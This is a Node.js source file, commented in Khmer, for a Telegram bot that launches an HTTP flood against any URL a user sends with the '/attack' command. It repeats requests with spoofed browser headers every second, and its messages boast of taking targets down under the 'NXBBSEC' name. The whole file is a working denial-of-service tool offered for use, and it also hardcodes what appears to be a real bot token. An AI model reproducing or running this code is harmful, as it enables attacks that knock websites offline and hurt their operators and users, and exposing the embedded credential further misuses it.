const os = require('os');
const TelegramBot = require('node-telegram-bot-api');

// កូដនេះសម្រាប់ require fetch នៅលើ Node.js version < 18.x (Termux)
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

// បញ្ចូល Bot Token របស់អ្នក
const token = '7837780403:AAGf8b4xzVaOedUZePHpqufIS4m4TdgqsGE';
const bot = new TelegramBot(token, { polling: true });

const headers = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Connection': 'keep-alive',
  'Upgrade-Insecure-Requests': '1000000'
};

function attack(target, headers) {
  fetch(target, { headers })
    .then(response => console.log(`⚡️ Attack BY NXBBSEC ⚡️ ${target}, STATUS: ${response.status}`))
    .catch(err => console.error(`🛑 DOWN BY NXBBSEC 🛑 : ${err.message}`));
}

const numCPUs = os.cpus().length;
const targetCPUUsage = 0.1;
const targetRequestsPerSecond = Math.floor(100 * targetCPUUsage);

bot.onText(/\/attack (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];

  if (!target.startsWith('http')) {
    bot.sendMessage(chatId, '❌ សូមបញ្ចូល URL ដោយត្រឹមត្រូវ (http/https)!');
    return;
  }

  bot.sendMessage(chatId, `🚀 ចាប់ផ្តើម attack លើ: ${target}\n🔫 ${targetRequestsPerSecond} requests/sec`);

  setInterval(() => {
    for (let i = 0; i < targetRequestsPerSecond; i++) {
      attack(target, headers);
    }
  }, 1000);
});

bot.onText(/\/(start|help)/, (msg) => {
  bot.sendMessage(msg.chat.id, `សូមប្រើបញ្ជា:\n/attack [url]\nឧទាហរណ៍: /attack https://example.com`);
});
